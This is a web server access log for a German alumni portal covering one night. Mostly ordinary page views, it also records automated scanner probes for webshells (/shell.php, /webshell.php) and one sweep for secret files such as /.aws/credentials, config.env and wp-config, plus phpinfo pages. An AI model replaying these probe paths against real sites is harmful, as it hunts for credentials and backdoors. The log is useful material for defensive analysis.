bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-19 00:41:46;/themen/details/fotografie-als-kunst-und-ausdruck;/gruppen;GET;200
ce8119a115d47469fdc30e280018b78c4dbe6ed75b5383bdae1ada573741b8ce;2025-11-19 00:45:17;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 01:01:51;/gruppen/hobby/biologie;/gruppen/interesse/recht-und-verwaltung;GET;200
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-19 01:03:12;/gruppen/hobby/biologie;/gruppen/hobby/podcasting;GET;302
5d805f0740041f39c329cf9634ba9cd4c8175fc53fbc96efc6594037872bc198;2025-11-19 01:03:13;/gruppen/hobby/biologie;/gruppen;GET;200
5c9d2c9d390655fc37bc7edef2f189fe93d0e487e02ea320250277d067b2e47e;2025-11-19 01:06:36;;/;GET;200
52d5c1a26ac11a9cee383a52d91288ef186a147c2158cf13a562310ea313ed09;2025-11-19 01:11:53;;/shell;GET;404
52d5c1a26ac11a9cee383a52d91288ef186a147c2158cf13a562310ea313ed09;2025-11-19 01:11:53;;/shell.php;GET;404
5ead24378ce2d5810b56b76e5e589b06d18fc6874d831b083db5084cbb3f1b7a;2025-11-19 01:12:00;;/webshell.php;GET;404
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 01:19:12;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 01:19:12;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
68a1f8e4f88a5697d56f9d953b255dcdb9fbf9ce3d1decdd47afb4bbe738e0db;2025-11-19 01:28:38;;/shell.php;GET;404
d9cea6d19401a6439b77aa7de8e9cd0afd38b80ad47b132f8e8744089c0fcb4d;2025-11-19 01:29:53;;/webshell;GET;404
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-19 01:33:39;;/;GET;200
7dd70f4798102f8dc7c4f57392eacb12fc8970c801753e8f37c7bc83f82bba6c;2025-11-19 01:35:12;;/aktuelles/meldungen?category=wissenschaft;GET;200
9f7f5352146d1a0da68e6cee7a52d0b4fc7a269ca247500c772e4e9ccfd185e9;2025-11-19 01:45:57;;/shell;GET;404
6322f17ff58b76c63c2b60341908c43173373a5fccf6bc581cdd9fad9bd81df4;2025-11-19 01:46:11;;/gruppen/hobby/sozialwissenschaften;GET;302
13155f0783ceffdf3bfc067a493297585800409f9750c657a07b3667d195d610;2025-11-19 01:47:37;;/;GET;200
c02e585ad1328b4ce751737884d98c58b6595ea907c5b6602f89669fbea0c97a;2025-11-19 01:47:53;;/docs/img/logout.svg;GET;404
7823bfdafd81aac0bbee815fed4596f6e2207134fbc15a7bf0a97c86753ce9a7;2025-11-19 01:48:17;;/webshell;GET;404
87d24795c4582c9b3eb2da5882cf87cd198d2fa272cde3f03f5bea3d005979a0;2025-11-19 01:51:35;;/webshell.php;GET;404
14fca039f6d723e1a3e9ddacbf5c2364768691dd3167691562f496ef950bb1d5;2025-11-19 01:52:23;;/;GET;200
f887db10f5898514680a50735e1a341f769e0aaf77d74c6cbaa22d2bc38de90b;2025-11-19 01:54:19;;/;GET;200
049aba1984d9e62ac70a68426cd422ee993d1cb2bdce2a848facdaa71763810c;2025-11-19 01:55:17;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 01:58:38;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/5506;GET;200
21a3b0d0883539595f4a9321aa38ab4bfc87df088e3aac867d0b252432fc20ac;2025-11-19 01:59:00;/;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 02:00:02;/themen/details/fotografie-als-kunst-und-ausdruck;/personen/alumni/schule/183052;GET;200
2cf357dbba8e3dc3f6e0c57af017090988b506b68644bd3cb5925eb7b9ac2cbf;2025-11-19 02:02:01;;/;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 02:07:49;/personen/alumni/details/josephine-muller;/personen/alumni/details/josephine-muller;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-19 02:12:15;;/favicon.192x192.png;GET;404
e8f2f853638e327a26ae6b20ae7dd35c4ff207587874a997a6396c1d7b7a0d60;2025-11-19 02:12:41;;/;HEAD;200
a7f9ca8d0febfcbe6eb4761d5247751fbe04e30332d17bea27281f61580b6c52;2025-11-19 02:15:50;;/gruppen/hobby/vogelbeobachtung;GET;302
dd2af611d1e2f2d23f99a9bc1ec5e1b42395c16b386b783f7078ca97e3c98105;2025-11-19 02:23:40;;/;GET;200
6da684d88bf7ee04b7d0dace8c20402492572d32e8d270604b62d85a6fd7c0d5;2025-11-19 02:26:38;/;/;GET;200
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:26:59;;/;GET;200
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:27:09;;/ads.txt;GET;404
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:27:09;;/app-ads.txt;GET;404
1e96482127a5b06a4c674eec3413862c0db82a50334342a14b32eae67392d849;2025-11-19 02:27:10;;/sellers.json;GET;404
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-19 02:32:17;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 02:33:14;;/;GET;200
c20bb8ba7a7910aa72e83471b0a4c794d3f937aa5de50f453acd0c8d898f6b09;2025-11-19 02:33:14;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;/https:/ga.jspm.io/npm:es-module-shims@1.10.0/dist/es-module-shims.js;GET;404
dd2af611d1e2f2d23f99a9bc1ec5e1b42395c16b386b783f7078ca97e3c98105;2025-11-19 02:38:02;;/sitemap.xml;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-19 02:38:40;/veranstaltungen/details/wohnzimmerkonzert;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
15d310a50cad63e36eb549db63f94e19686a03f414c9941e84b6e52dbe01bc11;2025-11-19 02:53:04;;/personen/alumni/details/felix-fischer;GET;200
7fb20d3d6f6f562cf97ac39770d16ae1a0325553020f85391cf02eeea0848d39;2025-11-19 02:54:08;;/;GET;200
7fb20d3d6f6f562cf97ac39770d16ae1a0325553020f85391cf02eeea0848d39;2025-11-19 02:54:19;/;/about/allgemein;GET;200
00ae46a4743798a80afad65ec2d0265fc6dd7a8872e9d3b3b5857f3c26b96d4e;2025-11-19 02:56:02;;/veranstaltungen/details/wohnzimmerkonzert;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-19 03:03:41;;/?XDEBUG_SESSION_START=phpstorm;GET;200
c612c8e33f702a0bbef3634aa0eb029fa7689a75f6570177636d4421f650808c;2025-11-19 03:04:34;;/;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-19 03:09:51;/gruppen/hobby/biologie;/gruppen/hobby/nahen-und-textilarbeiten;GET;302
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-19 03:09:52;/gruppen/hobby/biologie;/gruppen;GET;200
4be85216f05427d3d925da3170f4c05f8052bb0905e568be7de5d82aae32c3b5;2025-11-19 03:23:38;;/reset-password;GET;200
7af86b19ce5c484390bba1a725ba71f3b46cda9066ef0abbab7ba157c2e92bc3;2025-11-19 03:29:05;/;/;GET;200
7af86b19ce5c484390bba1a725ba71f3b46cda9066ef0abbab7ba157c2e92bc3;2025-11-19 03:30:41;/;/;GET;200
40c9bdfd9967cdba840f6cc9d4aba0619b35ad0cbe6bd6a650dc624370067e3a;2025-11-19 03:34:47;/;/;GET;200
39526245f20a0a64951b08ab81d1089343573b1377a7aae37e35c0f419e0b5b3;2025-11-19 03:40:25;;/personen/alumni/details/sidney-dittrich;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-19 04:11:08;;/themen?category=community;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-19 04:11:18;;/themen/details/stipendien-fur-den-zweiten-bildungsweg;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-19 04:11:33;;/themen/details/fotografie-als-kunst-und-ausdruck;GET;200
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-19 04:13:22;;/;GET;200
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-19 04:13:23;;/sendgrid.env;GET;404
1a5e0a3f79b3d54c505c6fa0aff1c655e18423543fbd48cb4a3fb8cab7e5ac17;2025-11-19 04:13:23;;/twilio.env;GET;404
90d49ab21e2e98cef6a87c5217805db0c26c480f504be36f2c19237a453dc05e;2025-11-19 04:14:24;;/personen/alumni/details/sami-teuchert;GET;200
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:15;;/ab2g;GET;404
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:16;;/ab2h;GET;404
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:16;;/alive.php;GET;404
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:19;;/;GET;200
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:20;;/;GET;200
35d5080e1ca15cbc43b3f4f92d437f556854118a08effe424a9dedc2dad038e7;2025-11-19 04:21:20;;/teorema505?t=1;GET;404
9dfd57f2a7c88c49bbac1caf270521447f79a1dc5f31508211f881372ac44c68;2025-11-19 04:26:01;;/;GET;200
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-19 04:29:11;;/;GET;200
1a24e3deee64e524cb59b79fbabf79166b09741e576ffea55e864608519b34d8;2025-11-19 04:33:30;;/;GET;200
1a24e3deee64e524cb59b79fbabf79166b09741e576ffea55e864608519b34d8;2025-11-19 04:33:30;;/;GET;200
3100652c05be2b726b399c79c07104ada90a3563e685cc34e0abbfb3b01cc158;2025-11-19 04:35:03;;/wp-content/;GET;404
d0d1fe322ac94d3a622e2b6f84b0133b1d28a3e0944089ec75449ec25e89d4f1;2025-11-19 04:40:57;;/personen/alumni/details/luca-onorini;GET;200
5ce8d5931cfb7f6abb14de4abae5cecfdb33c80a7362fd2a1ae93da9a860369b;2025-11-19 04:44:41;/;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-19 04:49:57;;/actuator/gateway/routes;GET;404
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 04:51:25;/gruppen/hobby/biologie;/gruppen/hobby/lesen;GET;302
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-19 04:51:26;/gruppen/hobby/biologie;/gruppen;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-19 04:52:46;/gruppen/hobby/biologie;/gruppen/hobby/fremdsprachen;GET;302
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-19 04:52:47;/gruppen/hobby/biologie;/gruppen;GET;200
a6358c16800dc001dec3fa61b24dcec8134a91882323a20eff094fcc57038086;2025-11-19 04:58:53;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-19 05:01:55;;/personen/alumni/schule/4240628;GET;200
00ecdbf98b90e6d582f1d323c955f2950ebcce223f7ab65082520149d3fb3976;2025-11-19 05:05:18;;/gruppen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:30;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:31;;/;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:41;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/aktuelles/stellenangebote;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:43;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/aktuelles/stellenangebote;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:47;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:54;;/personen;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:56;;/themen/details/der-start-ins-studium;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:05:56;;/themen/details/abschied-aus-moabit;GET;200
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:06:28;;/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:06:40;;/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:06:48;;/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_profiler/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_profiler/phpinfo/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:02;;/_profiler/phpinfo/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:22;;/_profiler/phpinfo/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:41;;/wp-config;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:48;;/wp-config;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:07:56;;/aws-secret.yaml;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:21;;/env.backup;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/xampp/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/lara/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/lara/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:08:22;;/laravel/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/api/shared/config/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/api/shared/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/api/config.env;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:25;;/service/email_service.py;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/server/config/database.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/scripts/nodemailer.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/.aws/credentials;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:26;;/dashboard/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/static/js/main.141b0494.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/static/js/2.ca066a4b.chunk.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/static/js/main.e85f7a37.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/admin/server_info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server_info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/app_dev.php/_profiler/phpinfo;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/test.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server-info;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server-info.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/secured/phpinfo.php;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/config.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/server.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/appsettings.json;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:27;;/shared/config/config.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/config/aws.yml;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/settings.py;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/config.json;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/main.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/config/constants.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/application.properties;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/public/js/main.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/js/main.js;GET;404
86b165993ac8408c0002fcd21cb156d038673b46ea2bc2e6fd55985b56690588;2025-11-19 05:09:28;;/?phpinfo=1;GET;200
3ba70cd48dd81f25e5ee7e0d0d9576d339dbcd25a52bdc5d456ce9c9b3c150d6;2025-11-19 05:27:53;;/;GET;200
102a7f91bd6509d03a9f46c5ec9f1b0e30b080c4e501e724bf1c9f673d4bf7e8;2025-11-19 05:29:42;;/personen/alumni/details/josephine-muller;GET;200
80db4c5995539e53579176eeb9be27bf0bb8c3242b99c6049d839e4f27229174;2025-11-19 05:31:11;;/aktuelles/meldungen?category=community;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-19 05:33:17;;/personen/alumni/schule/4240628;GET;200
f7935a091cef300ed7866fb32936d10f677698882d33f3895caebd9d30532748;2025-11-19 05:41:54;;/per;GET;404
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-19 05:46:59;;/;GET;200
898dadbe3663b29c0519ce0b36d243c0f5c2d51ea43962ac7b1b9bdda4c25f35;2025-11-19 05:47:28;;/;GET;200
c52c62fa6623376e0c7338d2d93be99602756268e3905872a5ce39ca56b20b49;2025-11-19 05:47:52;;/personen/alumni/schule/9009;GET;200
14b5401f661320b0b245cfafec72f9f4b4d5ed8934cd2bd9fc02a8be408fa664;2025-11-19 05:55:52;;/;GET;200
d443d894f48565f31b8185855cb137b806483104dcb2d4df7edd27c3453fbf48;2025-11-19 06:08:42;;/;GET;200
48c31a3bdca03ba471bbfc3b6d4587d5863e8c938f54c02764c85fbef591b991;2025-11-19 06:14:01;;/;GET;200
0764d84419c08f57713e96ffb7c66b7ab7a64cdf2d548580829a84ba32137dbb;2025-11-19 06:17:37;;/;GET;200
602ab43109481a92b73988128e66ee5028cbf17514c935096c4b815bbdb5c369;2025-11-19 06:18:46;;/;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:18:57;;/dns-query?dns=DjMBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:18:59;;/dns-query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:00;;/dns-query?dns=HP4BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:03;;/dns-query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:07;;/query?dns=KywBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:14;;/query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:19;;/query?dns=uIoBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:29;;/query?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:32;;/resolve?dns=gPEBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:41;;/resolve?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:46;;/resolve?dns=7O0BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:53;;/resolve?name=example.com&type=A;GET;404
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:19:55;;/?dns=zE0BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:20:03;;/?name=example.com&type=A;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:20:09;;/?dns=Dy0BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE;GET;200
a8a79d61b406cedfa0ca99a45601455e99a43b2e7fa77b3c85e63afaaa184df5;2025-11-19 06:20:24;;/?name=example.com&type=A;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:01;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:09;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:09;;/webui;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:11;;/webui;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:11;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:15;;/;GET;200
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:15;;/owa/;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:15;;/owa/;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:16;;/owa/;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:16;;/owa/;GET;404
620a7f747d645bc031ee314d774e9189a75d292d1edb4838545f0017ac2a424e;2025-11-19 06:22:29;;/;GET;200
2e7aca3c40179dcc04caed621cc95a4bd373dae41cac1bad84040f5e79d51a1e;2025-11-19 06:23:09;;/;GET;200
5667a28fd17b93daa042169fdaa5d19c2f368c9481af3a32fe4039af608354b3;2025-11-19 06:24:01;;/;GET;200
b5197f20e793da0c1169bd5586720c37d2107dedbec9a22154a38a85d3a49d95;2025-11-19 06:39:24;;/;GET;200
05e04808a5b28e813de54f9120e6bb28008d9ff460fdc5f7a083a4d5ab8410fa;2025-11-19 06:41:07;;/;GET;200
05e04808a5b28e813de54f9120e6bb28008d9ff460fdc5f7a083a4d5ab8410fa;2025-11-19 06:41:13;;/;GET;200
42d7d58f11a9f8cb8abcd7cb9d8d96cd4df1305064a7c130e58701f3eb1e333b;2025-11-19 07:15:33;;/docs/img/n_Taster_an_A0.png;GET;404
352a6ef90002509b9be6633e6270374cd7ed5ee2dfd9768ee256c63e51e1a790;2025-11-19 07:18:41;;/;GET;200
ccbfff91b0cff17369f411e940b1e49248805b9012ad07dca113967bc6c62bbd;2025-11-19 07:19:19;;/;GET;200
e1d635aa7a5b60920787053c3c1ffeefe2686ed727612d7a7e344c2f87cd8ae4;2025-11-19 07:34:18;;/;GET;200
db74955cefedc2e7401fc3f7b3ac2a590d937bb23fa918da91d5e299714a4f21;2025-11-19 07:50:50;;/;GET;200
0db2f769cd12490d24cb41736a53818182941dafc130cd8b26c931bb3b2dc313;2025-11-19 07:51:45;;/media/cache/avatar_sm/images/user/18.jpeg;GET;404
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-19 07:54:55;;/personen/alumni/schule/190627;GET;200
